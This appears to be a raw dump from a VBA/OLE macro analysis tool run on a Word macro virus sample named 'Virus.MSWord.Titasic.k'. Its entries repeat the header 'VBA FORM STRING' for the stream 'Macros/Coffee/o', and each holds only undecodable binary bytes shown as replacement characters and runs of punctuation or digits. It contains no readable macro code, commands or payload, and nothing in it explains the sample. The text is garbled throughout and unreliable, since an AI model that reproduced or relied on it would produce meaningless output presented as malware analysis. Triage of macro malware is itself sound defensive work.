- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꗗ�---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!---���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!888���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
888������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ᮮ�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!!!!!!!!!!!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꗗ�---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϓ�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ��������444
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g)))������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!!!!!!!888���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������---!!!!!!!!!!!!!!!!!!!!!!!!---���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ϛ�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
꣣����---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������������zzz
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
۰�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
қ��������   
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�444������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!!!!!!!!!!!!!!!!!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������888
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!!!!!!!!!!!!!!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꨨ�(((!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ɣ�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������---!!!!!!!!!!!!!!!!!!888���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꥥ�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ϛ��������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ�����������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������   
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$$$������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ϝ�����������---!!!!!!!!!!!!!!!!!!!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!///���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
      
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ����������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������888!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&&&���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������������)))
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xxx���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ꚛ����������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+++������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ�������������������������������������������---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꥥ�������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!!!!!!!---������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ����������$$$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ�������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꥥ�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ�������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)))���---!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!888������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|||������---!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!---���������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ϝ��������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
